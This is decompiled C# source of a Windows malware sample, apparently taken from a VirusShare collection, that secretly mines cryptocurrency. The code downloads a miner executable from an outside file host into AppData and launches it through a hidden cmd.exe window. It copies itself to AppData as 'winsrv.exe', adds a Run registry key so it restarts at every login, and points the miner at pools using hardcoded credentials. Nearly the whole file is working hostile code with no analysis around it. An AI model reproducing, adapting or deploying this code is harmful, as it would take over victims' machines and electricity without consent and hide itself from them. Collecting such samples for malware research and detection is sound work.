// Decompiled with JetBrains decompiler
// Type: Main
// Assembly: Miner, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: EE765818-AC20-4E52-B522-F1907477A257
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\HEUR-Trojan-Ransom.Win32.Generic-0ef682451c1c14df1d96663a886d048b4809ce22acb59d338ed88facf261a419.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;

[StandardModule]
internal sealed class Main
{
  private static string EXE_PATH = Path.Combine(Interaction.Environ("AppData"), "winminer.exe");
  private static string MINER_URL = "http://ge.tt/api/1/files/1HhgPWe/0/blob?download";

  private static void Download()
  {
    using (WebClient webClient = new WebClient())
      webClient.DownloadFile(global::Main.MINER_URL, global::Main.EXE_PATH);
  }

  public static void Start(string Pool, string Username, string Password, int nCores, bool GPU = false)
  {
    if (!System.IO.File.Exists(global::Main.EXE_PATH))
      global::Main.Download();
    int num = nCores;
    Process process = new Process();
    ProcessStartInfo startInfo = process.StartInfo;
    startInfo.FileName = "cmd.exe";
    startInfo.WindowStyle = ProcessWindowStyle.Hidden;
    startInfo.CreateNoWindow = true;
    if (GPU)
      startInfo.Arguments = string.Format("/c " + global::Main.EXE_PATH + " -o {0} -u {1} -p {2} -t {3} -g yes", (object) Pool, (object) Username, (object) Password, (object) num);
    else
      startInfo.Arguments = string.Format("/c " + global::Main.EXE_PATH + " -o {0} -u {1} -p {2} -t {3} -g no", (object) Pool, (object) Username, (object) Password, (object) num);
    process.Start();
  }

  public static void Close()
  {
    Process[] processesByName = Process.GetProcessesByName("winminer");
    int index = 0;
    while (index < processesByName.Length)
    {
      processesByName[index].Kill();
      checked { ++index; }
    }
  }

  [STAThread]
  public static void Main()
  {
    try
    {
      global::Main.Close();
      System.IO.File.Copy(Assembly.GetExecutingAssembly().Location, Interaction.Environ("AppData") + "\\winsrv.exe");
      MyProject.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("winsrv.exe", (object) (Interaction.Environ("AppData") + "\\winsrv.exe"));
      string Pool = "http://mypool.com:port/";
      string Username = "User";
      string Password = "Password";
      int num = 63;
      bool GPU = false;
      int nCores = checked ((int) Math.Round(unchecked ((double) Environment.ProcessorCount / 100.0 * (double) num - 1.0)));
      global::Main.Start("http://eu.triplemining.com:8344/", "java_ja", "apfel123", 1);
      global::Main.Start(Pool, Username, Password, nCores, GPU);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
  }
}
